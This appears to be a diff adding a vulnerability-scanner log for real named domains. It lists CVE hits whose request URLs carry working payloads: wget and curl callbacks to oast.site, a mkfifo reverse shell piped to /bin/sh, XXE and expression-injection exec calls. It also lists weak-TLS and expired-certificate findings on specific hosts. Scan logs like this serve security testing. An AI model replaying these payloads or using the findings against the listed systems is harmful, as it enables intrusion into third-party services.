@@ -1,0 +1,31 @@
+[CVE-2014-3206] [http] [critical] https://fakevod.ant.fun/backupmgt/localJob.php?session=fail;wget+http://d9krflklr2r3erlen4lghgoqm5yob3b4g.oast.site;
+[CVE-2014-3206] [http] [critical] https://fakevod.ant.fun/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9krflklr2r3erlen4lg8764z4dwka38k.oast.site;
+[CVE-2018-17173] [http] [critical] https://fakevod.ant.fun/qsr_server/device/getThumbnail?sourceUri=\'%2b-%253brm%2b/tmp/f%253bmkfifo%2b/tmp/f%253bcat%2b/tmp/f|/bin/sh%2b-i%2b2>%25261|curl%2bhttp%253a//d9krflklr2r3erlen4lgozkxugciwpx4i.oast.site%2b>/tmp/f%253b\';&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
+[CVE-2019-2767] [http] [high] https://fakevod.ant.fun/xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//d9krflklr2r3erlen4lgig4rtqxmy96q8.oast.site/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123
+[CVE-2020-7796] [http] [critical] https://fakevod.ant.fun/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://d9krflklr2r3erlen4lgddh4wxeqowcqf.oast.site%23
+[CVE-2021-32305] [http] [critical] https://fakevod.ant.fun/search.php?search=%22;wget+http%3A%2F%2Fd9krflklr2r3erlen4lg5kgj6m4poucwc.oast.site%27;%22
+[CVE-2021-33544] [http] [high] https://fakevod.ant.fun//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9krflklr2r3erlen4lg5rxj3b6p9rk9d.oast.site)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[weak-cipher-suites:tls-1.0] [ssl] [low] downloads.minepi.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] downloads.minepi.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] earn-manager-proxy.coti.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dream-fan-shares-sd.dashboard.securitize.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dorahacks.securitize.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] earn-manager-proxy.coti.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dream-fan-shares-sd.dashboard.securitize.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dorahacks.securitize.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] fallback.securitize.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] fallback.securitize.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] faucet.coti.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] fakevod.ant.fun:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] fakevod.ant.fun:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] faucet.coti.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] flex.trade:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] flex.trade:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[CVE-2021-22053] [http] [high] https://fakevod.ant.fun/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22curl%20http://d9krflklr2r3erlen4lgukeco356gefzh.oast.site%22%29%7D__::.x/
+[CVE-2023-34993] [http] [critical] https://fakevod.ant.fun/ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile=U3TM7%3Bcurl%20d9krflklr2r3erlen4lg5a58xn8dwhbmu.oast.site%20%23
+[CVE-2018-15517] [http] [high] https://fakevod.ant.fun/index.php/System/MailConnect/host/d9krflklr2r3erlen4lg5f7ie6eqat6ej.oast.site/port/80/secure/
+[expired-ssl] [ssl] [low] explorer.minepi.com:443 ["2023-05-30 17:05:14 +0000 UTC"]
+[expired-ssl] [ssl] [low] fallback.securitize.io:443 ["2022-08-27 23:59:59 +0000 UTC"]
+[expired-ssl] [ssl] [low] forum.minepi.com:443 ["2023-05-30 17:05:14 +0000 UTC"]
+[expired-ssl] [ssl] [low] firsthandsummit.app.pons.ai:443 ["2025-08-30 03:21:28 +0000 UTC"]
+[expired-ssl] [ssl] [low] foodpandahk10a.app.pons.ai:443 ["2025-08-27 18:10:29 +0000 UTC"]
